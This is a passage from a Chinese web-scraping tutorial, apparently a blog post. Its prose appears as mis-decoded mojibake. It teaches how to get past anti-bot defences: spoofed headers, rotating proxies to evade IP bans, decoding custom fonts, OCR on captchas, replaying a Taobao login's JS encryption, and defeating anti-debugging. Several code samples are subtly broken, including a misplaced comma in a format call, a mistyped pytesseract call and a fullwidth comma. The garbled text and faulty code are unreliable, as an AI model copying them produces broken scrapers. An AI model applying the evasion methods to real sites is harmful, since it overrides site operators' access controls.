ç¼ºçš„æƒ…å†µä¸‹ï¼Œæ ¹æ®ç½‘é¡µç»“æ„è¿›è¡Œåˆ†æï¼Œå¹¶è‡ªåŠ¨å¡«å†™è¡¨å•</li></ol><h2 id="ç¼–å†™ç½‘ç»œçˆ¬è™«">ç¼–å†™ç½‘ç»œçˆ¬è™«</h2><h3 id="requestsè¯·æ±‚åº“ä½¿ç”¨">requestsè¯·æ±‚åº“ä½¿ç”¨</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&quot;user-agent&quot;</span>:</span><br><span class="line"><span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line">response=requests.get(url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><h3 id="bs4è§£æåº“ä½¿ç”¨">bs4è§£æåº“ä½¿ç”¨</h3><p>'.'å¯¹åº”classå±æ€§ï¼Œâ€˜#â€™å¯¹åº”idå±æ€§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&quot;user-agent&quot;</span>:</span><br><span class="line"><span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&quot;</span>&#125;</span><br><span class="line">response=requests.get(url,headers=headers)</span><br><span class="line"><span class="comment">#print(response.text)</span></span><br><span class="line">soup=BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>) <span class="comment">#lxmlæ˜¯ä¸€ä¸ªè§£æå™¨</span></span><br><span class="line">btn=soup.select_one(<span class="string">&#x27;#su&#x27;</span>) <span class="comment">#å®šä½é‡‡ç”¨CSSé€‰æ‹©å™¨ å®šä½ç²¾ç¡® ç®€ä¾¿</span></span><br><span class="line"><span class="built_in">print</span>(btn[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#å› ä¸ºbs4è¿”å›çš„èŠ‚ç‚¹éƒ½æ˜¯pythonå¯¹è±¡ï¼Œæ‰€ä»¥è·å–htmlæ ‡ç­¾ä¸­çš„å…ƒç´ åªéœ€åƒpythonä¸­è·å–å­—å…¸å½¢å¼ä¸€æ ·å»è·å–</span></span><br></pre></td></tr></table></figure><p>ä»è¯·æ±‚è§’åº¦ï¼Œåçˆ¬è™«å¯ä»¥åœ¨httpæ•°æ®åŒ…ä¸­è¿›è¡Œ</p><ol><li>è¦æ±‚ç”¨æˆ·æ³¨å†Œç™»å½•æ‰èƒ½æŸ¥çœ‹æ•°æ®ï¼Œå‘åŒ…å½¢å¼ä¸ºGETä¸POSTæ··åˆ</li><li>æ·»åŠ User-Agentï¼ŒRefereræˆ–è€…Cookieå¤´éƒ¨æ ¡éªŒ</li><li>å¢åŠ éªŒè¯ç ï¼Œå°†è¯·æ±‚åŒ…ä¸­çš„å‚æ•°è¿›è¡ŒjsåŠ å¯†</li></ol><p>ä»æ•°æ®è§’åº¦ï¼Œåçˆ¬è™«å¯ä»¥é€šè¿‡é˜»ç¢çˆ¬è™«å¼€å‘è€…æŸ¥çœ‹ç½‘é¡µæºä»£ç æ¥è¿›è¡Œ</p><ol><li>ç¦æ­¢ç”¨æˆ·å³å‡»æˆ–è€…f12</li><li>æ·»åŠ æ§åˆ¶å°åè°ƒè¯•ï¼Œä½¿ç”¨æ— é™å¾ªç¯debuggerå¦¨ç¢è°ƒè¯•è€…</li><li>æ”¹å˜æ•°æ®åŠ è½½æ–¹å¼ï¼Œä½¿ç”¨AjaxåŠ¨æ€åŠ è½½</li><li>è¿›è¡Œæ•°æ®åŠ å¯†ï¼Œè¿”å›çš„æ•°æ®é€šè¿‡è„šæœ¬æ–‡ä»¶è§£å¯†åå†å±•ç¤º</li><li>å¯¹åŠ å¯†è„šæœ¬è¿›è¡Œæ··æ·†ï¼Œè®©çˆ¬è™«è€…æ— æ³•é˜…è¯»æºä»£ç </li></ol><p>çˆ¬è™«å¼€å‘è€…ä¸ç½‘ç«™å¼€å‘è€…å¯¹æŠ—çš„<strong>äº”ä¸ªé˜¶æ®µ</strong></p><p><img src="/posts/95017dfa.htm/image-20241113144740357.png" alt="image-20241113144740357"></p><h1>å¸¸è§„åçˆ¬è™«æŠ€å·§</h1><h2 id="Headerså¤´éƒ¨æ ¡éªŒ">Headerså¤´éƒ¨æ ¡éªŒ</h2><p>å¯¹å¤´éƒ¨çš„ä¸‰ä¸ªä¸»è¦é”®å€¼å¯¹è¿›è¡Œåˆ¤æ–­</p><ol><li>User-Agentï¼šæ£€æµ‹è¯·æ±‚è€…çš„ç”¨æˆ·ä»£ç†ï¼Œæ­¤é¡¹ç¼ºå¤±åˆ™åˆ¤å®šä¸ºæœºå™¨äºº</li><li>Refererï¼šæ£€æµ‹è¯·æ±‚è€…æ˜¯å¦ä»¥æ­£å¸¸é€”å¾„è·³è½¬åˆ°æœ¬é¡µé¢ï¼Œå¸¸ç”¨äºé˜²ç›—é“¾æŠ€æœ¯</li><li>Cookieï¼šæ£€æµ‹è¯·æ±‚è€…èº«ä»½çŠ¶æ€ï¼Œéœ€è¦ç™»å½•æ‰èƒ½è®¿é—®çš„ç½‘ç«™é€šå¸¸éœ€è¦æºå¸¦</li></ol><p>åº”å¯¹æ–¹æ³•ï¼šç›´æ¥å¤åˆ¶è¯·æ±‚å¤´ä¸­ç›¸åº”é”®å€¼å¯¹ï¼Œéœ€æ³¨æ„ï¼šéœ€è¦ç™»å½•æ‰èƒ½è®¿é—®çš„ç½‘ç«™ï¼ŒCookieæœ‰æ—¶æ•ˆæ€§ï¼Œéœ€è¦åŠæ—¶æ›´æ–°</p><p><strong>cookieä¼ é€’</strong></p><p>éœ€è¦ç™»å½•æ‰èƒ½è·å–ç½‘é¡µæ•°æ®ï¼Œæˆ–è€…éœ€è¦è·¨è¯·æ±‚ä¿æŒå‚æ•°æ—¶ï¼Œå¯ä»¥ç”¨sessionå¯¹è±¡ï¼Œè‡ªåŠ¨ç®¡ç†Cookieï¼Œå½“ç”¨æˆ·ç™»å½•ä¸€ä¸ªé¡µé¢ï¼Œå®ƒå¯ä»¥è‡ªåŠ¨è¯†åˆ«responseä¸­Set-Cookieé”®å€¼å¯¹ï¼Œä¸ºåç»­è¯·æ±‚ç»´æŒè¿™ä¸ªCookieæ¥ä¿æŒä¼šè¯ä¿¡æ¯</p><p>ä¸‹é¢æ˜¯POST+GETä¾‹å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#ä½¿ç”¨sessionå…±äº«cookie</span></span><br><span class="line">url=<span class="string">&quot;http://www.test.com/login&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;12345&quot;</span>&#125;</span><br><span class="line">headers=&#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;xxxxx&quot;</span>&#125;</span><br><span class="line">session=requests.session()</span><br><span class="line">session.headers=headers</span><br><span class="line">post_html=session.post(url,data=data) <span class="comment">#æ¨¡æ‹Ÿç™»å½•</span></span><br><span class="line">get_html=session.get(<span class="string">&quot;http://www.test.com/get&quot;</span>) <span class="comment">#ä¼ é€’Cookieè¿›è¡Œä¿¡æ¯è·å–</span></span><br><span class="line"><span class="built_in">print</span>(get_html.text)</span><br></pre></td></tr></table></figure><h2 id="IPåœ°å€è®°å½•">IPåœ°å€è®°å½•</h2><p>é˜²æ­¢çŸ­æ—¶é—´å†…å¤§é‡å‘èµ·httpè¯·æ±‚</p><p>è¿™ç§åçˆ¬è™«æ‰‹æ®µåŸç†æ˜¯æ£€æµ‹å¼‚å¸¸è®¿é—®çš„ç”¨æˆ·ï¼Œå¦‚æœæœ‰è¯·æ±‚åœ¨çŸ­æ—¶é—´å†…è¿ç»­è®¿é—®ç½‘ç«™æ•°åæ¬¡ï¼Œå¯¹ipè¿›è¡Œè®°å½•ï¼Œåˆ¤å®šä¸ºæœºå™¨äººï¼Œå½“è¯¥ipå†æ¬¡å‘èµ·è¯·æ±‚ï¼Œå“åº”403ã€‚</p><p>åº”å¯¹æ–¹æ³•ï¼š</p><p>å‡ç¼“httpè¯·æ±‚é—´éš”ï¼Œæˆ–è€…å»ºç«‹ipä»£ç†æ± ï¼Œåœ¨è¿›è¡Œè¯·æ±‚æ—¶ä½¿ç”¨ipä»£ç†ï¼Œè¢«æ£€æµ‹åæ›´æ¢ipå³å¯ã€‚</p><p><strong>æ¡ˆä¾‹ï¼šè±†ç“£ç½‘ç«™</strong></p><p><strong>1.ç”¨æˆ·å»¶è¿Ÿè®¿é—®</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DelayRequests</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,delay=<span class="number">3</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.delay = delay</span><br><span class="line">        <span class="variable language_">self</span>.urls=&#123;&#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wait</span>(<span class="params">self,url</span>):</span><br><span class="line">        netloc=parse.urlparse(url).netloc</span><br><span class="line">        <span class="built_in">print</span>(netloc)</span><br><span class="line">        lastone=<span class="variable language_">self</span>.urls.get(netloc,<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(lastone)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.delay&gt;<span class="number">0</span> <span class="keyword">and</span> lastone:</span><br><span class="line">            sleeptime=<span class="variable language_">self</span>.delay-(datetime.now()-lastone).seconds</span><br><span class="line">            <span class="keyword">if</span> sleeptime&gt;<span class="number">0</span>:</span><br><span class="line">                time.sleep(sleeptime)</span><br><span class="line">        <span class="variable language_">self</span>.urls[netloc]=datetime.now()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®°å½•çˆ¬å–è¿‡çš„ç½‘ç«™åŸŸåï¼Œå¦‚æœä¸‹ä¸€æ¬¡è®¿é—®ä¸ä¸Šä¸€æ¬¡è®¿é—®åŸŸåç›¸åŒï¼Œä¸”é—´éš”åœ¨è®¾ç½®çš„å»¶è¿Ÿæ—¶é—´å†…ï¼Œå°±è®©çˆ¬è™«æ²‰ç¡çŸ¥é“å»¶è¿Ÿæ—¶é—´è·‘æ»¡</p><p><strong>2.æ„å»ºIPä»£ç†æ± </strong></p><p>çˆ¬å–æŸå¿«ä»£ç†ç½‘ç«™çš„å…è´¹ä»£ç†ï¼Œæ„å»ºIPä»£ç†æ± çš„ä»£ç æ–¹æ¡ˆ</p><p>ç½‘ç«™çš„ç¿»é¡µurlæ•°å­—é€’å¢åŠ ä¸€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰€è·å–ä»£ç†æ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">proxy</span>): </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(<span class="string">&quot;è¦è®¿é—®çš„ç›®æ ‡url&quot;</span>, proxies=proxy, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;è·å–å¯ç”¨ä»£ç†&#123;&#125;&quot;</span>.<span class="built_in">format</span>(proxy))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;ä¸å¯ç”¨ä»£ç†&quot;</span>.<span class="built_in">format</span>(proxy))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#è·å–ä»£ç†</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_proxy</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        url=<span class="string">&#x27;http://www.kuaidaili.com/free/inha/&#123;&#125;&#x27;</span>,<span class="built_in">format</span>(i)</span><br><span class="line">        response =requests.get(url)</span><br><span class="line">        soup=BeautifulSoup(response)</span><br><span class="line">        datas=soup.select(<span class="string">&#x27;tbody tr&#x27;</span>)</span><br><span class="line">        proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://localhost:8888&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://localhost:8888&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">            ip=data.select(<span class="string">&#x27;td&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            port=data.select(<span class="string">&#x27;td&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            proxy=<span class="string">&quot;http://&quot;</span>+ip.text+<span class="string">&quot;:&quot;</span>+port.text</span><br><span class="line">            proxies[<span class="string">&#x27;http&#x27;</span>]=proxy</span><br><span class="line">            proxies[<span class="string">&#x27;https&#x27;</span>] = proxy</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Get proxy&quot;</span>,<span class="string">&quot;IP:&quot;</span>,ip.text,<span class="string">&quot;Port:&quot;</span>,port.text)</span><br><span class="line">            verify(proxies)</span><br></pre></td></tr></table></figure><h2 id="Ajaxå¼‚æ­¥åŠ è½½">Ajaxå¼‚æ­¥åŠ è½½</h2><p>ç®€å•æ¥è¯´å°±æ˜¯åœ¨è®¿é—®ä¸€ä¸ªé¡µé¢æ—¶ï¼ŒURLæœ¬èº«æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œé¡µé¢å†…å®¹å´å‘ç”Ÿäº†åŠ¨æ€æ›´æ–°ã€‚è¿™æ—¶ï¼Œç›´æ¥ä½¿ç”¨getè¯·æ±‚å»è·å–ç½‘ç«™å†…å®¹æ˜¯å®šä½ä¸åˆ°å…·ä½“å†…å®¹çš„ï¼Œå› ä¸ºä»–çš„è·å–ä¸€èˆ¬æ˜¯ç»ç”±æ•°æ®æ¥å£è¿›è¡Œè¿”å›çš„</p><p>é¢å¯¹æ­¤ç±»æŠ€æœ¯åªéœ€è¦ç½‘é¡µæŠ“åŒ…ï¼Œåœ¨å¤§é‡æ•°æ®åŒ…ä¸­å¯»æ‰¾çœŸæ­£åŒ…å«ç½‘é¡µå†…å®¹çš„æ•°æ®æ¥å£å³å¯ã€‚å› ä¸ºæ•°æ®å¦‚æœæ¸²æŸ“åˆ°é¡µé¢å°±ä¸€å®šä¼šæœ‰æ•°æ®åŒ…å°†å…¶ä¼ è¾“åˆ°å®¢æˆ·ç«¯ï¼Œæ­¤ç±»æŠ€æœ¯è¿›è¡Œæ•°æ®ä¼ è¾“è¿”å›çš„ç»“æœéƒ½æ˜¯JSONæ ¼å¼ï¼Œç”¨JSONåŒ…è¿›è¡Œæ•°æ®è§£æã€‚JSONæ ¼å¼æ‰€ä»¥ä¸éœ€è¦bs4è§£æDOMè¯­æ³•æ ‘</p><h2 id="å­—ä½“åçˆ¬è™«">å­—ä½“åçˆ¬è™«</h2><p>å¯¹æ•°æ®è¿›è¡Œåçˆ¬è™«æ“ä½œã€‚è¦è·å–çš„ç½‘é¡µæ•°æ®åœ¨æµè§ˆå™¨ä¸­æ­£å¸¸æŸ¥çœ‹ï¼Œå°†å…¶å¤åˆ¶åˆ°æœ¬åœ°å°±ä¼šä¹±ç ï¼Œä»–çš„åŸç†æ˜¯ç½‘ç«™è‡ªå®šä¹‰åˆ›é€ ä¸€å¥—å­—ä½“ï¼Œæ„å»ºæ˜ å°„å…³ç³»åå°†å…¶æ·»åŠ åˆ°cssçš„fontä¸­ï¼Œåœ¨æµè§ˆå™¨ä¸­æŸ¥çœ‹ç½‘ç«™ä¼šè‡ªåŠ¨è·å–è¿™äº›æ–‡ä»¶ä»è€Œå»ºç«‹å¯¹åº”å…³ç³»æ˜ å°„å¾—åˆ°å­—ç¬¦ï¼Œçˆ¬è™«æ—¶ï¼Œæ˜ å°„æ–‡ä»¶ç©ºç¼ºï¼Œæ²¡æœ‰å­—ç¬¦é›†è§£å­—ç¬¦ï¼Œå¯¼è‡´ä¹±ç </p><p>åº”å¯¹ä¸¤ä¸ªæ–¹æ³•ï¼š</p><ol><li>æ‰¾åˆ°fontæ–‡ä»¶çš„urlåœ°å€ï¼Œå°†å…¶ä¸‹è½½åˆ°æœ¬åœ°åä½¿ç”¨xmlè§£æå·¥å…·è§£æï¼Œç„¶åæ ¹æ®å…¶ä¸­å­—ç¬¦å¯¹åº”å…³ç³»ï¼Œå»ºç«‹æœ¬åœ°æ˜ å°„è¿›è¡Œå­—ç¬¦æ›¿æ¢</li><li>æ‰‹åŠ¨å¤åˆ¶å…¶ä¸­åŠ å¯†å­—ç¬¦ï¼Œåœ¨æœ¬åœ°encodeç¼–ç ï¼Œå»ºç«‹è‡ªå·±çš„æœ¬åœ°æ˜ å°„å­—å…¸ï¼Œç„¶åè¿›è¡Œå­—ç¬¦çˆ¬å–æ›¿æ¢</li></ol><p><strong>æ¡ˆä¾‹ï¼šå®ä¹ åƒ§pythonå²—ä½</strong></p><p><img src="/posts/95017dfa.htm/image-20241113163522007.png" alt="image-20241113163522007"></p><p><img src="/posts/95017dfa.htm/image-20241113163535965.png" alt="image-20241113163535965"></p><p>å‘ç°ç¡®å®æœ‰ä¸€äº›æ˜¯ä¹±ç ï¼Œ</p><p>**é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•:**é¦–å…ˆå¤åˆ¶å•ä¸ªæ— æ³•æ˜¾ç¤ºå­—ç¬¦ï¼Œencodeç¼–ç ï¼Œè¿™é‡Œä»¥1-3ä¸ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">one=<span class="string">&#x27; &#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">two=<span class="string">&#x27; &#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">three=<span class="string">&#x27; &#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;xxxxx&#x27;</span>&#125;</span><br><span class="line">response=requests.get(<span class="string">&#x27;ç›®æ ‡url&#x27;</span>ï¼Œheaders=headers)</span><br><span class="line">soup=BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">salary=soup.select(<span class="string">&#x27;span.day.font&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> salary:</span><br><span class="line">    number=s.text.encode(<span class="string">&#x27;utf-8&#x27;</span>).replace(one,<span class="string">b&#x27;1&#x27;</span>).replace(two,<span class="string">b&#x27;2&#x27;</span>).replace(three,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(number.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="éªŒè¯ç åçˆ¬è™«">éªŒè¯ç åçˆ¬è™«</h2><p>éªŒè¯ç é˜²æŠ¤ä¸¤ä¸ªé˜¶æ®µï¼šç™»å½•æ³¨å†Œé˜¶æ®µå’Œè®¿é—®é¡µé¢é˜¶æ®µ</p><p>å¦‚æœçªç ´äº†ç™»å½•æ³¨å†Œé˜¶æ®µï¼Œå‘ç°ä¸€ipçŸ­æ—¶é—´å¤šæ¬¡è®¿é—®ï¼Œä¸ä¼šç›´æ¥å°ipï¼Œè€Œæ˜¯å‡ºç°éªŒè¯ç ï¼Œé˜²æ­¢è¯¯ä¼¤æ­£å¸¸ç”¨æˆ·ï¼Œ</p><p>è®­ç»ƒå¤§æ¨¡å‹çš„ç½‘ç»œçˆ¬è™«å¯ä»¥çªç ´éªŒè¯ç ï¼Œæ‰€ä»¥å¼€å‘è€…ä¼šåœ¨éªŒè¯ç èƒŒååŠ ä¸Šjså‚æ•°åŠ å¯†ï¼Œæé«˜éš¾åº¦ã€‚ä¸è¿‡ä½¿ç”¨ç‰¹æ®Šå·¥å…·seleniumå¯ä»¥ç›´æ¥æ­é…æ¨¡å‹æ¨¡æ‹Ÿäººç±»è¡Œä¸ºé€šè¿‡éªŒè¯ç ï¼Œæ— é¡»ç ´è§£jså‚æ•°åŠ å¯†</p><p>å¯¹äºè‹±æ•°éªŒè¯ç ï¼Œä½¿ç”¨å…‰å­¦å­—ç¬¦è¯†åˆ«ç›´æ¥è¯†åˆ«è‹±æ•°éªŒè¯ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">image=Image.<span class="built_in">open</span>(<span class="string">&quot;1234.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract,image_to_string(image))</span><br></pre></td></tr></table></figure><h2 id="JSå‚æ•°åŠ å¯†">JSå‚æ•°åŠ å¯†</h2><p>å¸¸ç”¨äºpostè¡¨å•æäº¤ï¼Œä¸»è¦æ˜¯ä¸ºäº†é˜²èŒƒæ¶æ„æœºå™¨äººæ‰¹é‡æ³¨å†Œä¸æ¨¡æ‹Ÿç™»å½•ç­‰è¡Œä¸ºï¼Œå¦‚æœå¯¹POSTè¡¨å•è¿›è¡ŒæŠ“åŒ…ä¼šå‘ç°åœ¨è¡¨å•é‡Œè¾“å…¥çš„æ•°æ®è¢«åŠ å¯†æˆäº†ä¸å¯çŸ¥çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸»è¦æ˜¯é€šè¿‡åŠ è½½ç½‘ç«™çš„æœ¬åœ°JSè„šæœ¬å®ç°çš„</p><p>åº”å¯¹æ–¹æ³•ï¼š</p><ol><li>ç®€å•çš„åŠ å¯†å¯ä»¥ç›´æ¥ä½¿ç”¨pythonè¯­è¨€è¿›è¡Œå¤ç°</li><li>è¾ƒå¤æ‚ä¸€äº›çš„åŠ å¯†å¯ä»¥å°†å…·ä½“å‡½æ•°æå–å‡ºæ¥ï¼Œç»„æˆåŠ å¯†è„šæœ¬åæ¨¡æ‹Ÿè¿è¡Œ</li></ol><p>æ·˜å®ç™»å½•æ¡ˆä¾‹ä¸­ï¼š</p><p>æ‰¾åˆ°åŠ å¯†jsä»£ç ï¼Œå‘½åä¸ºpassword2.jsä¿å­˜åœ¨æœ¬åœ°ï¼Œå¹¶ç¼–å†™getPwdæ¥å£ç”¨äºpythonè°ƒç”¨</p><p><img src="/posts/95017dfa.htm/image-20241113202428075.png" alt="image-20241113202428075"></p><p>æœ€åé€šè¿‡pythonè°ƒç”¨è¿™ä¸ªjsè„šæœ¬ï¼Œè·å–åŠ å¯†ç»“æœ</p><p>(execjsç”¨äºpythonè°ƒç”¨js)</p><p><img src="/posts/95017dfa.htm/image-20241113202553906.png" alt="image-20241113202553906"></p><h2 id="JSåè°ƒè¯•">JSåè°ƒè¯•</h2><p>æœ€ç®€å•çš„ï¼šæ£€æµ‹æ˜¯å¦æ‰“å¼€å¼€å‘è€…å·¥å…·æˆ–è€…æ˜¯å¦ä¿®æ”¹æœ¬åœ°JSè„šæœ¬æ–‡ä»¶ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦è¿›è¡Œæ— é™debuggerçš„å¡é¡¿ï¼Œè®©æ”»å‡»è€…æ— æ³•è°ƒè¯•ã€‚</p><p>è¿™ç§åçˆ¬è™«çš„ç ´è§£å¯ä»¥é€šè¿‡JS Hook</p><p>å¯¹äºæ— é™å¾ªç¯debuggeråº”å¯¹ï¼š</p><ol><li>åœ¨debuggerè®¾ç½®æ¡ä»¶æ–­ç‚¹å†™å…¥false</li><li>æœ¬åœ°è¦†ç›–ï¼šåœ¨ä½¿ç”¨æœ¬åœ°è¦†ç›–æ—¶ï¼Œå‘ç°è¿™ä¸ªJSæ–‡ä»¶åå­—æ˜¯VMXXXï¼Œæ˜¾ç„¶ä¸æ˜¯æ­£å¸¸çš„jsè„šæœ¬æ–‡ä»¶ã€‚å› ä¸ºå½“AjaxåŠ è½½htmlå†…å®¹æ—¶ï¼Œå¦‚æœåŒ…å«scriptæ ‡ç­¾ï¼ŒChromeå°±ä¼šè‡ªåŠ¨å¯¹è„šæœ¬è¿›è¡Œeval()è¿ç®—ï¼Œå¹¶è¢«Chromeçš„sourceé¢æ¿è¯†åˆ«ä¸ºVMå¼€å¤´çš„æ–°æ–‡ä»¶ï¼Œè½¬åˆ°ç½‘ç»œé¢æ¿ï¼Œæ‰¾åˆ°Ajaxè¯·æ±‚ï¼ŒåŸå§‹çš„jsä¼šå­˜æ”¾åœ¨å“åº”é‡Œï¼Œç„¶åæœ¬åœ°å»é™¤å…¶ä¸­çš„debuggeræˆ–è€…åè°ƒè¯•å‡½æ•°ï¼Œå°†ä¿®æ”¹è¿‡çš„æ–‡ä»¶è¿”å›å›å»ã€‚</li></ol><h2 id="ASTæ··æ·†åçˆ¬è™«">ASTæ··æ·†åçˆ¬è™«</h2><p>æŠŠä»£ç è¿›è¡Œastæ··æ·†ï¼Œè½¬åŒ–ä¸ºä¸å¯é˜…è¯»ï¼Œä¸å¯è¯†åˆ«å´èƒ½æ­£å¸¸è¿ä½œçš„ä¹±ç æ–‡ä»¶ã€‚</p><h1>æ··æ·†jsæ‰‹åŠ¨é€†å‘æ–¹æ³•</h1><p><strong>åŸºæœ¬æ­¥éª¤</strong></p><ul><li>å®šä½åŠ å¯†å…¥å£</li><li>æ··æ·†ç‰¹å¾åˆ†æ</li><li>åŠ å¯†å‡½æ•°è¿˜åŸ</li></ul><h2 id="æ•°ç»„æ··æ·†å’Œæ•°ç»„ä¹±åº">æ•°ç»„æ··æ·†å’Œæ•°ç»„ä¹±åº</h2><p>æ•°ç»„æ··æ·†æ˜¯å°†å…¨è„šæœ¬çš„æ‰€æœ‰å­—ç¬¦ä¸²è¿›è¡Œæå–åŠ å¯†ï¼Œåœ¨jsè„šæœ¬å¤´éƒ¨ç»„æˆåŠ 